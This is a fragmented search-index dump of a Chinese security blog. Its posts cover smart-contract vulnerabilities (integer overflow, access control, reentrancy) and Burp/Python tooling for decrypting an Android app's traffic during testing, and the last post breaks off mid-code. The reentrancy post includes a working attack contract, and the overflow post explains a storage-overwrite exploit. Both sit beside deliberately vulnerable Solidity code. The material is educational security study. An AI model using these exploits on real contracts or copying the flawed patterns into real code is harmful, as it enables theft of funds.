TOP10的第三类漏洞。这类算数漏洞比较常见 also known as integer overflow and integer underflow ","date":"2018-07-25","objectID":"/posts/dasp-arithmetic-issues-3.html:1:0","tags":["BlockChain","DASP"],"title":"#DASP# Arithmetic Issues (3)","uri":"/posts/dasp-arithmetic-issues-3.html"},{"categories":["区块链"],"content":"0x01 原理 整型溢出的原理很简单，以8位整型为例，借图说明上溢。 8位无符号整型范围[0, 255]: 8位有符号整型范围[-128, 127]: 对于下溢 (unit8)0-1=(uint8)255, (int8)(-128)-1=(int8)127. ","date":"2018-07-25","objectID":"/posts/dasp-arithmetic-issues-3.html:2:0","tags":["BlockChain","DASP"],"title":"#DASP# Arithmetic Issues (3)","uri":"/posts/dasp-arithmetic-issues-3.html"},{"categories":["区块链"],"content":"0x02 场景 对于智能合约常见的整型溢出漏洞，会出现在如下场景： 经典场景，没有检查下溢 function withdraw(uint _amount) { require(balances[msg.sender] - _amount \u003e 0); // 如果 _amount \u003e msg.sender, underflow msg.sender.transfer(_amount); // 会transfer一个很大的值 balances[msg.sender] -= _amount; } off-by-one function popArrayOfThings() { require(arrayOfThings.length \u003e= 0); arrayOfThings.length--; // length是uint，当length=0，length--会下溢翻转；同样++也需要注意 } 关键字var var会根据分配值更改为最小适配类型，下例中i=0，因此i被分配为uint8。因此i最大255，当somethingLarge\u003e256时，i就会上溢。 for (var i = 0; i \u003c somethingLarge; i ++) { // ... } ","date":"2018-07-25","objectID":"/posts/dasp-arithmetic-issues-3.html:3:0","tags":["BlockChain","DASP"],"title":"#DASP# Arithmetic Issues (3)","uri":"/posts/dasp-arithmetic-issues-3.html"},{"categories":["区块链"],"content":"0x03 实例 ","date":"2018-07-25","objectID":"/posts/dasp-arithmetic-issues-3.html:4:0","tags":["BlockChain","DASP"],"title":"#DASP# Arithmetic Issues (3)","uri":"/posts/dasp-arithmetic-issues-3.html"},{"categories":["区块链"],"content":"上溢漏洞 Hexagon 分析：代币变泡沫，以太坊Hexagon溢出漏洞比狗庄还过分 Code: Source Code 漏洞函数： function _transfer(address _from, address _to, uint _value) internal { /* Prevent transfer to 0x0 address. Use burn() instead */ require (_to != 0x0); /* Check if the sender has enough */ require (balanceOf[_from] \u003e= _value + burnPerTransaction); // Boom! /* Check for overflows */ require (balanceOf[_to] + _value \u003e balanceOf[_to]); /* Subtract from the sender */ balanceOf[_from] -= _value + burnPerTransaction; /* Add the same to the recipient */ balanceOf[_to] += _value; /* Apply transaction fee */ balanceOf[0x0] += burnPerTransaction; /* Update current supply */ currentSupply -= burnPerTransaction; /* Notify network */ Burn(_from, burnPerTransaction); /* Notify network */ Transfer(_from, _to, _value); } 典型的整型上溢漏洞。 通过remix可以复现漏洞： SMT 分析： Solidity合约中的整数安全问题——SMT/BEC合约整数溢出解析 New proxyOverflow Bug in Multiple ERC20 Smart Contracts (CVE-2018-10376) Code: Source Code 漏洞函数： function transferProxy(address _from, address _to, uint256 _value, uint256 _feeSmt, uint8 _v,bytes32 _r, bytes32 _s) public transferAllowed(_from) returns (bool){ if(balances[_from] \u003c _feeSmt + _value) revert(); // Boom! uint256 nonce = nonces[_from]; bytes32 h = keccak256(_from,_to,_value,_feeSmt,nonce); if(_from != ecrecover(h,_v,_r,_s)) revert(); if(balances[_to] + _value \u003c balances[_to] || balances[msg.sender] + _feeSmt \u003c balances[msg.sender]) revert(); balances[_to] += _value; Transfer(_from, _to, _value); balances[msg.sender] += _feeSmt; Transfer(_from, msg.sender, _feeSmt); balances[_from] -= _value + _feeSmt; nonces[_from] = nonce + 1; return true; } 通过remix可以复现漏洞： BEC 分析： ALERT: New batchOverflow Bug in Multiple ERC20 Smart Contracts (CVE-2018-10299) Code: Source Code 漏洞函数： function batchTransfer(address[] _receivers, uint256 _value) public whenNotPaused returns (bool) { uint cnt = _receivers.length; uint256 amount = uint256(cnt) * _value; // Boom! require(cnt \u003e 0 \u0026\u0026 cnt \u003c= 20); require(_value \u003e 0 \u0026\u0026 balances[msg.sender] \u003e= amount); balances[msg.sender] = balances[msg.sender].sub(amount); for (uint i = 0; i \u003c cnt; i++) { balances[_receivers[i]] = balances[_receivers[i]].add(_value); Transfer(msg.sender, _receivers[i], _value); } return true; } 通过remix可以复现漏洞： ","date":"2018-07-25","objectID":"/posts/dasp-arithmetic-issues-3.html:4:1","tags":["BlockChain","DASP"],"title":"#DASP# Arithmetic Issues (3)","uri":"/posts/dasp-arithmetic-issues-3.html"},{"categories":["区块链"],"content":"下溢漏洞 MerdeToken 以上的漏洞都很简单，简单分析既能找到Bug，而这个漏洞就很有意思了，一度被怀疑是后门。 分析： MerdeToken: It’s Some Hot Shit Code: Source Code MDT就是一个token contract，你可以通过该合约设置信任第三方及取币额度，还有常规的存币，交易和取币操作。但该合约额外提供了并不需要的奖金代码操作，而此功能存在漏洞，可以任意修改取币额度限制，因此被怀疑是后门。 漏洞其实很简单，bonusCodes.length如果等于0，bonusCodes.length–会造成下溢翻转变为 2**256-1。 function popBonusCode() onlyOwner { require(bonusCodes.length \u003e= 0); bonusCodes.length--; // Boom! } 漏洞的利用方式很有趣，有点像二进制中的栈溢出和任意内存写，这里着重讲解。 首先你需要理解Solidity中的状态变量存储模型（Layout of State Variables in Storage）。 理解模型有几个关键点： 合约的存储由一个256位指针处理，而合约内的变量都存储在以合约指针为基址的偏移地址中。 大小固定的变量（除了mapping，变长数组以外的所有类型）在存储中是依次连续从位置0开始排列在一个个32字节槽中。 如果多个变量占用的大小少于32字节，会尽可能的打包到单个槽位里。 由于mapping和变长数组的大小不可预知，因此定义使用keccak256哈希来计算数据存储位置。 对于mapping，会在mapping定义位置（p）占用一个槽位，但其中无数据，而数据存储位置通过 keccak256(k . p)计算得到，k为mapping键。 对于动态数组，会在数组定义位置（p）占用一个槽位，存储数组元素个数，而数据存储位置通过 keccak256(p)计算得到。 其中第四点比较难理解，我们通过该MerdeToken合约说明。 在MerdeToken中定义了如下状态变量： address public owner; address public trustedThirdParty; mapping (address =\u003e uint) public balanceOf; uint public deposited; uint public withdrawLimit; uint[] public bonusCodes; 在storage中从位置0依次排列 \"storage\": { 0x00 : (address)owner, 0x01 : (address)trustedThirdParty, 0x02 : (mapping)balanceOf, 0x03 : (uint)deposited, 0x04 : (uint)withdrawLimit, 0x05 : (uint[])bonusCodes } 其中balanceOf为mapping映射，而位置为0x02，因此在0x02位置为空值，而balanceOf中k对应的value在storage中的存储位置计算方式为keccak256(k . 0x02)。 bonusCodes为动态数组，位置为0x05，故在0x05中存储数组长度（数组有值后），而bonusCodes数组起始位置在storage中计算方式为keccak256(0x05)。 Ok，理解了以上，接下来就说下如何通过bonusCodes整型下溢来修改withdrawLimit值，这是另一个难点。 storage有256位的地址空间，状态变量从地址0依次排列，而通过 bonusCodes.length-- 溢出使得bonusCodes数组长度变为2**256-1，覆盖了几乎所有storage地址空间。因此withdrawLimit变量也在bonusCodes数组中，需要计算找到withdrawLimit对应的数组下标。 计算方式：Converting Array Indices to Addresses 画个图帮你理解： storage + --------------------------- + -- 0x00 | owner | | | \u003c- index: 2**256-keccak256(0x05) + --------------------------- + | | 0x01 | trustedThirdParty | | | + --------------------------- + | | 0x02 | balanceOf(None) | | | + --------------------------- + | | 0x03 | deposited | v | + --------------------------- + | | 0x04 | withdrawLimit | | | \u003c- index: 2**256-keccak256(0x05)+4 + --------------------------- + | | 0x05 --| bonusCodes.length | | | | + --------------------------- + | | | | | | | | + --------------------------- + | ^ | | ... | | | | + --------------------------- + V | | | | | | + --------------------------- + -\u003e- | keccak256(0x05) -\u003e| address(bonusCodes) | | | \u003c- index: 0 + --------------------------- + | | | | | | + --------------------------- + v | | ... | | | + --------------------------- + | | 2**256-1 | | -- + --------------------------- + 最后就是通过合约提供的modifyBonusCode函数修改withdrawLimit值来突破取币额度的限制。 ","date":"2018-07-25","objectID":"/posts/dasp-arithmetic-issues-3.html:4:2","tags":["BlockChain","DASP"],"title":"#DASP# Arithmetic Issues (3)","uri":"/posts/dasp-arithmetic-issues-3.html"},{"categories":["区块链"],"content":"0x00 Info 本篇为DASP TOP10的第二类漏洞Access Control。通过Parity及Rubixi合约分析理解此类型漏洞，改写OpenZeppelin中题目辅助理解。 ","date":"2018-07-24","objectID":"/posts/dasp-access-control-2.html:1:0","tags":["BlockChain","DASP"],"title":"#DASP# Access Control (2)","uri":"/posts/dasp-access-control-2.html"},{"categories":["区块链"],"content":"0x01 Access Control 概念：攻击者通过合约不安全的可见性设置时可以直接访问合约的私有变量和函数，这其中需要可能需要绕过一些访问控制。 在使用 Solidity 编写合约代码时，有几种默认的变量或函数访问域关键字：private, public, external 和 internal，对合约实例方法来讲，默认可见状态为 public，而合约实例变量的默认可见状态为 private。 具体讲解参见solidity develop visibility 这里需要重点关注下external和internal，external函数为合约接口，只能被其他合约调用（在自身需通过this.f()调用）。而internal函数只能被自身调用。 此类漏洞经常会发生在以下场景： 合约使用已经遗弃的tx.origin验证调用者 通过很长的require处理大量的认证逻辑 通过delegatecall调用代理库或者代理合约 通俗讲就是一般的智能合约会通过初始化指定合约的拥有者，来实现类似赋予特权后收回合约资金的功能。而初始化函数如果能被任何人调用的话，攻击者就会将自己成为合约拥有者进行提币或恶意操作。 这里最著名的漏洞就是Parity Wallet Hack。但在介绍该漏洞前需要理解一些solidity知识。 ","date":"2018-07-24","objectID":"/posts/dasp-access-control-2.html:2:0","tags":["BlockChain","DASP"],"title":"#DASP# Access Control (2)","uri":"/posts/dasp-access-control-2.html"},{"categories":["区块链"],"content":"0x02 tx.origin Solidity: Tx Origin Attacks 在solidity官方文档中已经声明禁止使用tx.origin做认证。 Quote If your wallet had checked msg.sender for authorization, it would get the address of the attack wallet, instead of the owner address. But by checking tx.origin, it gets the original address that kicked off the transaction, which is still the owner address. The attack wallet instantly drains all your funds. 在solidity中获取合约调用方地址有tx.origin和msg.sender两种方式，但msg.sender代表直接调用者的地址，而tx.origin代表源调用地址。 举例： 用户A通过合约B调用合约C 对于合约B，tx.origin和msg.sender均为A 对于合约C，tx.origin为A，msg.sender为B ","date":"2018-07-24","objectID":"/posts/dasp-access-control-2.html:3:0","tags":["BlockChain","DASP"],"title":"#DASP# Access Control (2)","uri":"/posts/dasp-access-control-2.html"},{"categories":["区块链"],"content":"0x03 call \u0026 delegatecall 向合约发送消息有两种底层调用的接口，一个是call，一个是delegatecall。 call的原型为： \u003caddress\u003e.call.value(...)(...) returns (bool) delegatecall原型为： \u003caddress\u003e.delegatecall(...) returns (bool) 具体的使用可以看call相关函数 这里有两点需要特别强调 二者的异同： 相同 不同 1. 调用时传递合约所有gas 1. call可以使用.value传ETH 2. 执行失败返回fasle 2. call的外部调用上下文是外部合约，而delegatecall的外部调用上下文是自身 这里借图说话： 实例（可在remix操作）： contract A { event callMeMaybeEvent(address _from); function callMeMaybe() payable public { callMeMaybeEvent(this); } } contract B { function callTheOtherContract(address _contractAddress) public { require(_contractAddress.call(bytes4(keccak256(\"callMeMaybe()\")))); require(_contractAddress.delegatecall(bytes4(keccak256(\"callMeMaybe()\")))); SomeLib.calledSomeLibFun(); } } library SomeLib { event calledSomeLib(address _from); function calledSomeLibFun() public { calledSomeLib(this); } } 向另一个合约发送数据时，找不到对应的方法签名，会默认调用fallback()函数。而solidity中的代理库和代理合约正是依据此特性。具体可以看看Proxy Libraries in Solidity。Parity正是依照代理库模式开发，该模式可以解决大量代码的重复部署问题，同时能够减少重复部署产生的gas消耗，最重要可以实现更新只需更新库而不用重新更新部署每个项目。 有了上述的知识储备后进入正题，现实合约中的访问控制漏洞。 ","date":"2018-07-24","objectID":"/posts/dasp-access-control-2.html:4:0","tags":["BlockChain","DASP"],"title":"#DASP# Access Control (2)","uri":"/posts/dasp-access-control-2.html"},{"categories":["区块链"],"content":"0x04 Parity 首先建议阅读一些分析文章，然后说说自己的理解 推荐zeppelin（区块链安全公司）的分析： The Parity Wallet Hack Explained 中文分析： Parity多重签名函数库自杀漏洞 Parity多重签名合约Delegatecall漏洞回顾 Code: WalletLibrary enhanced-wallet.sol 大体浏览钱包合约代码，其中有四个合约模块： WalletEvents // 事件合约，打印日志 WalletAbi // 提供abi接口 WalletLibrary // 代理库，继承WalletEvents。钱包的核心逻辑，漏洞点正是该合约的initWallet -\u003e initMultiowned函数 Wallet // 钱包合约，可以看到代码量很小，通过fallback函数的delegatecall函数调用WalletLibrary函数 可以看到Parity使用了代理库模式。在使用Wallet逻辑时，是间接通过传递参数调用WalletLibrary中函数 _walletLibrary.delegatecall(msg.data); 而WalletLibrary库中initWallet -\u003e initMultiowned函数又没有做任何校验即可改变合约的拥有者，故而形成漏洞。 ","date":"2018-07-24","objectID":"/posts/dasp-access-control-2.html:5:0","tags":["BlockChain","DASP"],"title":"#DASP# Access Control (2)","uri":"/posts/dasp-access-control-2.html"},{"categories":["区块链"],"content":"0x05 Rubixi Rubixi合约中的访问控制漏洞 Code 可以直接copy进remix进行测试。将creator变量修改为public，通过DynamicPyramid函数即可恶意修改creator。 ","date":"2018-07-24","objectID":"/posts/dasp-access-control-2.html:6:0","tags":["BlockChain","DASP"],"title":"#DASP# Access Control (2)","uri":"/posts/dasp-access-control-2.html"},{"categories":["区块链"],"content":"0x06 ethernaut 在OpenZeppelin的ethernaut中有道Delegation题目，正好是此漏洞类型。 修改下合约名和函数名便于对比Parity漏洞进行理解： contract WalletLibaray { address public owner; function WalletLibaray(address _owner) { owner = _owner; } function initWallet() { owner = msg.sender; } } contract Wallet { address public owner; WalletLibaray _walletLib; function Wallet(address _walletLibAddress) { _walletLib = WalletLibaray(_walletLibAddress); owner = msg.sender; } function () { if (_walletLib.delegatecall(msg.data)) { this; } } } Wallet合约中构造函数实例化WalletLibaray。 通过fallback函数中delegatecall传参调用WalletLibaray库函数，调用无任何访问控制的initWallet函数即可改变owner。 ","date":"2018-07-24","objectID":"/posts/dasp-access-control-2.html:7:0","tags":["BlockChain","DASP"],"title":"#DASP# Access Control (2)","uri":"/posts/dasp-access-control-2.html"},{"categories":["区块链"],"content":"0x07 Fomo3D 参见#DASP# Bad Randomness (6) – Fomo3D ","date":"2018-07-24","objectID":"/posts/dasp-access-control-2.html:8:0","tags":["BlockChain","DASP"],"title":"#DASP# Access Control (2)","uri":"/posts/dasp-access-control-2.html"},{"categories":["区块链"],"content":"0x00 Info 从本篇开始学习智能合约漏洞，依据DASP TOP10。 ","date":"2018-07-20","objectID":"/posts/dasp-reentrancy-1.html:1:0","tags":["BlockChain","DASP"],"title":"#DASP# Reentrancy (1)","uri":"/posts/dasp-reentrancy-1.html"},{"categories":["区块链"],"content":"0x01 DAO History: The History of the DAO WhitePaper: WhitePaper 白皮书 OpenSource: Github etherscan ","date":"2018-07-20","objectID":"/posts/dasp-reentrancy-1.html:2:0","tags":["BlockChain","DASP"],"title":"#DASP# Reentrancy (1)","uri":"/posts/dasp-reentrancy-1.html"},{"categories":["区块链"],"content":"概念理解 众筹合约，通过资金ETH换取DAO token，从而获得投票和发起议案的权利，按一定规则回馈给投资人投资项目的收益。 因此，The DAO特点： 本质是个VC，通过以太坊筹集的资金（ETH）锁定在智能合约中，通过代码主导！ 出资ETH获取对应DAO代币，具有审查项目、投票表决和提出投资项目议案的权利 投资议案由全体代币持有人投票表决，一币一票，票数通过，投资项目可获得相应投资额。利用“众智”+出资额权重决定投资策略（取代传统行业投资经理）。 投资项目的收益按规则回馈股东。 ","date":"2018-07-20","objectID":"/posts/dasp-reentrancy-1.html:2:1","tags":["BlockChain","DASP"],"title":"#DASP# Reentrancy (1)","uri":"/posts/dasp-reentrancy-1.html"},{"categories":["区块链"],"content":"The DAO is attacked the-dao-the-hack-the-soft-fork-and-the-hard-fork security-alert-dos-vulnerability-in-the-soft-fork ","date":"2018-07-20","objectID":"/posts/dasp-reentrancy-1.html:2:2","tags":["BlockChain","DASP"],"title":"#DASP# Reentrancy (1)","uri":"/posts/dasp-reentrancy-1.html"},{"categories":["区块链"],"content":"0x02 Reentrancy ","date":"2018-07-20","objectID":"/posts/dasp-reentrancy-1.html:3:0","tags":["BlockChain","DASP"],"title":"#DASP# Reentrancy (1)","uri":"/posts/dasp-reentrancy-1.html"},{"categories":["区块链"],"content":"solidity基础知识 合约调用 message call bytes4 funcIdentifier = bytes4(keccak256(\"FuncName(paramType)\")); this.call(funcIdentifier, paramValue); contract object Contract1 c = Contract1(AddressOfContract1); c.foo(); 限制 例如send花费2300gas 递归调用栈最大1024层 转币 1. \u003caddress\u003e.transfer() //失败抛出throw且回滚，2300gas 2. \u003caddress\u003e.send() //失败返回false，2300gas 3. \u003caddress\u003e.gas().call.vale()() //失败返回false，所有gas fallback Solidity的fallback函数 contract SimpleFallback{ function(){ //fallback function } } 两种情况会调用fallback： 调用函数找不到时 向合约发送ether时 ","date":"2018-07-20","objectID":"/posts/dasp-reentrancy-1.html:3:1","tags":["BlockChain","DASP"],"title":"#DASP# Reentrancy (1)","uri":"/posts/dasp-reentrancy-1.html"},{"categories":["区块链"],"content":"reentrancy \u0026 The DAO DASP TOP10中reentrancy的描述：dasp reentrancy原型为Race-To-Empty，其中就已经介绍了重置资产放在转币操作后的漏洞。 其中最典型的攻击案例为The DAO。对于The DAO的漏洞分析及利用exp \u0026 demo网上一大堆，这里就不ctrlcv了。 建议结合源码一起看，并使用本地（truffle+testrpc or geth testnet）或者在线的remix编译环境上手实践。 可以首先看看中文分析： 区块链安全 - DAO攻击事件解析 以太坊智能合约安全入门 推荐Phil Daian分析： Analysis of the DAO exploit Quote attack steps: Propose a split and wait until the voting period expires. (DAO.sol, createProposal) Execute the split. (DAO.sol, splitDAO) Let the DAO send your new DAO its share of tokens. (splitDAO -\u003e TokenCreation.sol, createTokenProxy) Make sure the DAO tries to send you a reward before it updates your balance but after doing (3). (splitDAO -\u003e withdrawRewardFor -\u003e ManagedAccount.sol, payOut) While the DAO is doing (4), have it run splitDAO again with the same parameters as in (2) (payOut -\u003e _recipient.call.value -\u003e _recipient()) The DAO will now send you more child tokens, and go to withdraw your reward before updating your balance. (DAO.sol, splitDAO) Back to (5)! Let the DAO update your balance. Because (7) goes back to (5), it never actually will :-). 其中最关键的就是第4步，splitDAO -\u003e withdrawRewardFor -\u003e payOut，其中payOut使用_recipient.call.value(_amount)()转币，而splitDAO函数中资产重置是放在withdrawRewardFor函数后，造成漏洞。 demo \u0026 exp： SimpleDAO attack reentrancy exp 其他合约中的reentrancy漏洞：CityMayor Note 特别注意此篇中的分析思路及工具porosity/etherscan 漏洞合约： contract vulnerable_DAO{ mapping(address=\u003euint) userBalances; function vulnerable_DAO() payable { } function getUserBalance(address user) constant returns(uint) { return userBalances[user]; } function addToBalance() payable { userBalances[msg.sender] += msg.value; } function withdrawBalance() { uint amountToWithdraw = userBalances[msg.sender]; if(msg.sender.call.value(amountToWithdraw)() ==false) { throw; } userBalances[msg.sender] = 0; } function getBalance() returns(uint) { return this.balance; } } 攻击利用合约： contract Attack { address vulnerable_contract; uint attackCount; address public owner; function Attack() public{ attackCount = 2; owner = msg.sender; } function() payable{ while(attackCount\u003e0) { attackCount--; require(vulnerable_contract.call(bytes4(keccak256(\"withdrawBalance()\")))); } } function deposit(address _vulnerable_contract) public payable{ vulnerable_contract = _vulnerable_contract; require(vulnerable_contract.call.value(msg.value)(bytes4(keccak256(\"addToBalance()\")))); } function withdraw(){ require(vulnerable_contract.call(bytes4(keccak256(\"withdrawBalance()\")))); } function getBalance() returns(uint) { return this.balance; } } ","date":"2018-07-20","objectID":"/posts/dasp-reentrancy-1.html:3:2","tags":["BlockChain","DASP"],"title":"#DASP# Reentrancy (1)","uri":"/posts/dasp-reentrancy-1.html"},{"categories":["区块链"],"content":"正所谓不积跬步无以至千里，作为区块链安全学习的第一步，本篇汇聚区块链理论与实践的各种资源，通过知行来理解这个新领域，为安全研究做好伏笔。 ","date":"2018-07-12","objectID":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html:0:0","tags":["BlockChain"],"title":"BlockChain Resources","uri":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html"},{"categories":["区块链"],"content":"BlockChain 区块链技术指南 中文资料阅读站 算法演进 挖矿演进 共识机制演进 自写demo ","date":"2018-07-12","objectID":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html:1:0","tags":["BlockChain"],"title":"BlockChain Resources","uri":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html"},{"categories":["区块链"],"content":"矿池 PHP-MPOS node-open-mining-portal Powerpool ","date":"2018-07-12","objectID":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html:1:1","tags":["BlockChain"],"title":"BlockChain Resources","uri":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html"},{"categories":["区块链"],"content":"BitCoin 简介：how-bitcoin-works-under-hood whitepaper：bitcoin 中文注解：比特币白皮书 个人翻译+注解 ","date":"2018-07-12","objectID":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html:2:0","tags":["BlockChain"],"title":"BlockChain Resources","uri":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html"},{"categories":["区块链"],"content":"Ethereum ","date":"2018-07-12","objectID":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html:3:0","tags":["BlockChain"],"title":"BlockChain Resources","uri":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html"},{"categories":["区块链"],"content":"原理 whitepaper: White-Paper 中文：以太坊白皮书 ","date":"2018-07-12","objectID":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html:3:1","tags":["BlockChain"],"title":"BlockChain Resources","uri":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html"},{"categories":["区块链"],"content":"协议架构 https://github.com/ethereum/wiki/wiki/R\u0026D https://ethresear.ch ","date":"2018-07-12","objectID":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html:3:2","tags":["BlockChain"],"title":"BlockChain Resources","uri":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html"},{"categories":["区块链"],"content":"智能合约 Dapp state wiki：ÐApp Development 入门指南： The Hitchhiker’s Guide to Smart Contracts in Ethereum 以太坊开发入门，完整入门篇 Getting Started with Ethereum and Solidity learning-solidity-part-1-deploy-a-contract 开发事例： Create a Hello World Contract in ethereum Create a Token Contract Create a Crowdsale Contract How to create a private Ethereum network Comments Feed ","date":"2018-07-12","objectID":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html:3:3","tags":["BlockChain"],"title":"BlockChain Resources","uri":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html"},{"categories":["区块链"],"content":"客户端开发环境 Ethereum Clients IDE： remix truffle 模拟环境：testrpc 客户端： 全节点 geth 轻节点 parity cli：https://ethereum.org/cli testnet eth: http://faucet.ropsten.be:3001/ The NEW If you need some Ropsten Testnet Ethers testnet block explorer: https://ropsten.etherscan.io/ Dapp explorer： pc: mist moblie: status solidity: introduction-to-smart-contracts tools ethereumjs-tx web3 ","date":"2018-07-12","objectID":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html:3:4","tags":["BlockChain"],"title":"BlockChain Resources","uri":"/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90.html"},{"categories":["android网络"],"content":"0x00 背景 最近在做测试时发现应用使用 facebook 的 react-native 进行混合开发，对于想了解 react-native 的同学，可以查阅github和官方文档，网上也有很多 android 内嵌 react-native 进行混合开发的环境搭建及教程供学习，例如：https://blog.csdn.net/u011148116/article/details/58178348。 该应用核心业务接口数据加密，且加密逻辑在本地js中实现，而测试过程有代理明文抓包改参需求，而研究一二，并记录过程。 ","date":"2018-05-31","objectID":"/posts/%E5%86%85%E5%B5%8Creact%E7%9A%84android%E5%BA%94%E7%94%A8%E6%B5%81%E9%87%8F%E5%8A%A0%E8%A7%A3%E5%AF%86.html:1:0","tags":["burp","react-native"],"title":"内嵌React的android应用流量加解密","uri":"/posts/%E5%86%85%E5%B5%8Creact%E7%9A%84android%E5%BA%94%E7%94%A8%E6%B5%81%E9%87%8F%E5%8A%A0%E8%A7%A3%E5%AF%86.html"},{"categories":["android网络"],"content":"0x01 通信加解密历史 终端应用渗透测试包括 客户端\u003c–通信–\u003e服务端，客户端测试可以通过各种逆向反编译、动态调试、hook框架分析逻辑及攻击面，而服务端安全则需要通过中间人的方式抓包改参（人工、漏扫、fuzz）来挖掘服务端漏洞。 而现有的app基本都使用https传输，对数据敏感的应用会做二次加密或格式化序列化处理。针对https的原理和绕过可以参考android网络请求-证书认证，而对于二次加密，则需要逆向分析客户端代码了。 常见的加解密逻辑都会在java层或native层，通过url、头关键字、请求关键字、加密算法、log等关键字在反编译代码中搜寻定位。 绕过加密手段有: hook插件+代理插件的方式 hook插件+server+代理插件的方式 其核心都是在代理中获取明文数据，而明文加密的操作放在插件中。 hook插件+代理插件的方式hook插件+代理插件 \" hook插件+代理插件的方式 hook插件+server+代理插件的方式hook插件+server+代理插件 \" hook插件+server+代理插件的方式 ","date":"2018-05-31","objectID":"/posts/%E5%86%85%E5%B5%8Creact%E7%9A%84android%E5%BA%94%E7%94%A8%E6%B5%81%E9%87%8F%E5%8A%A0%E8%A7%A3%E5%AF%86.html:2:0","tags":["burp","react-native"],"title":"内嵌React的android应用流量加解密","uri":"/posts/%E5%86%85%E5%B5%8Creact%E7%9A%84android%E5%BA%94%E7%94%A8%E6%B5%81%E9%87%8F%E5%8A%A0%E8%A7%A3%E5%AF%86.html"},{"categories":["android网络"],"content":"0x02 react-native js解密 本次测试开始采用通用方式，在反编译代码中搜寻蛛丝马迹，然并卵，本以为请求逻辑做在了native中，简单搜索System.loadLibrary也未确定可疑so文件。 故通过解压apk，全局搜索接口关键字： grep -rn \"xxx\" . 在 assets 文件下的js文件中发现关键字： 可确定使用js+android混合开发，而网络请求与数据加密均由js实现。 那我们思路就是js强制发明文，经过burp加密发送；或者经过server加密，burp发送加密数据。 ok，思路清晰后，我们就要带着如下问题进行尝试： Question js中post数据构成逻辑为何？如何强制明文？ 两种方式工作量对比，若采用burp加密，是复现js加密算法，还是加载js？若采用server加密，改如何构建c（burp）-s（server）？ server我使用擅长的python实现，那如何在python中运行js？ 首先来看第一个问题： js文件index.android.bundle未做加密和强混淆，通过格式化即可看到代码原貌，通过关键字（箭头所指）确定发送请求和参数构造（图中文字）代码： 而参数经过一系列函数的运算加密生成： 发送明文也很简单，直接修改js代码 return r 即可，这里也打消在burp插件中复现js加密逻辑的想法，真的很复杂。 Info 这里因为修改了apk的资源文件，重压缩打包后需要签名，否则安装报错。 接着看第二个问题： 直接在burp插件中实现js的运行是否可行，用java需要js解释引擎，感觉上插件体量会比较大而且调试非常不方便。然而用python写插件会有各种异常（不推荐python写burp插件）。 想了一下还是采用server的方式。即在burp插件中实现明文请求拦截，并使用HttpClient发送至python httpserver，server对数据加密回传，burp利用setRequest发送加密后数据进行正常的业务请求。 流程大概如下： 其中burp中使用apache的httpcomponents-client包作为网络请求模块，burp插件处理请求代码： Info 注意在编辑器中生成burp所用的jar包时需要将第三方包一起打包，否则会报classnotfound错误，推荐使用fatjar打包方式 @Override public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) { String host = messageInfo.getHttpService().getHost(); if (host.contains(\"your_hostname\")){ if(messageIsRequest) { byte[] request = messageInfo.getRequest(); IRequestInfo ireinfo = helpers.analyzeRequest(request); List\u003cString\u003e headers = ireinfo.getHeaders(); int offset = ireinfo.getBodyOffset(); String body = helpers.bytesToString(request).substring(offset); stdout.println(\"request body---\u003e\\n\" + body); String ret = utls.Request(body); stdout.println(\"python response---\u003e\\n\" + ret); String newbody = \"{\\\"data\\\":\\\"\" + ret.split(\":\")[0] + \"\\\",\\\"customInfo\\\":\\\"\" + ret.split(\":\")[1] + \"\\\"}\"; stdout.println(\"newbody---\u003e\\n\" + newbody); messageInfo.setRequest(helpers.buildHttpMessage(headers, newbody.getBytes())); } } } python httpserver使用HTTPServer模块（py3.x）或BaseHTTPServer模块（py2.x） class PostHandler(BaseHTTPRequestHandler): def _writeheaders(self): print(self.path) print(self.headers) self.send_response(200); self.send_header('Content-type','text/html'); self.end_headers() def do_POST(self): # Parse the form data posted (host,port) = self.client_address print('connect from %s:%s' % (host,port)) self._writeheaders() nbytes = int(self.headers['content-length']) data = self.rfile.read(nbytes) post_values = json.loads(data.decode('utf-8')) print(post_values) data = post_values['data'] customInfo = post_values['customInfo'] if data: data_decrpyted = ctx.call('h',data) if customInfo: customInfo_decrpyted = ctx.call('h',customInfo) # new_post_values = {'data':data_decrpyted, 'customInfo':customInfo_decrpyted} new_post_values = data_decrpyted + ':' + customInfo_decrpyted print(new_post_values) try: # Error: a bytes-like object is required, not 'str'! 